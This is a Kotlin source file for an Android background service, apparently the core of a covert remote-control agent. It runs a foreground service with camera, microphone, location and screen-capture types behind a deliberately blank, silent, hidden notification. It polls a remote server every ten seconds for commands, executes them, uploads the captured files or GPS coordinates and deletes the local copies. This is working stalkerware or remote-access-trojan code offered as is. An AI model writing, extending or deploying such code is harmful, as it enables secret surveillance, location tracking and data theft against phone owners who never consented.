package org.hullas.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class HullasService : Service() {
    private val tag = "HullasService"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        ServiceLifecycleOwner.start()
        startSilentForeground()
        startPolling()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
        START_STICKY

    override fun onDestroy() {
        pollJob?.cancel()
        scope.cancel()
        ServiceLifecycleOwner.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startSilentForeground() {
        val notification = buildSilentNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION,
            )
        } else {
            @Suppress("DEPRECATION")
            startForeground(NOTIF_ID, notification)
        }
    }

    private fun startPolling() {
        pollJob?.cancel()
        pollJob = scope.launch {
            val api = ApiClient(this@HullasService)
            val executor = CommandExecutor(this@HullasService)
            var beat = 0
            while (isActive) {
                try {
                    if (beat % 6 == 0) api.heartbeat()
                    beat++
                    val cmd = api.poll()
                    if (cmd != null) {
                        Log.i(tag, "Buyruq: ${cmd.cmd}")
                        handleCommand(api, executor, cmd)
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Poll xato", e)
                }
                delay(10_000)
            }
        }
    }

    private suspend fun handleCommand(
        api: ApiClient,
        executor: CommandExecutor,
        cmd: Command,
    ) {
        val result = executor.execute(cmd)
        result.onSuccess { file ->
            if (cmd.cmd == "location") {
                api.sendResult(cmd.id, "failed", error = "Not implemented via file")
                return
            }
            if (file != null) {
                api.sendResult(cmd.id, "done", file = file)
                file.delete()
            } else {
                api.sendResult(cmd.id, "failed", error = "Fayl yaratilmadi")
            }
        }.onFailure { e ->
            if (e is LocationException && e.coords != null) {
                api.sendResult(
                    cmd.id, "done",
                    lat = e.coords.first, lon = e.coords.second,
                )
            } else {
                api.sendResult(cmd.id, "failed", error = e.message ?: "xato")
            }
        }
    }

    private fun buildSilentNotification(): Notification {
        val channelId = "hullas_silent"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                channelId, " ", NotificationManager.IMPORTANCE_NONE,
            ).apply {
                description = " "
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(null)
            .setContentText(null)
            .setSmallIcon(R.drawable.ic_empty)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .build()
    }

    companion object {
        const val NOTIF_ID = 1

        fun start(ctx: android.content.Context) {
            val i = Intent(ctx, HullasService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i)
            } else {
                ctx.startService(i)
            }
        }
    }
}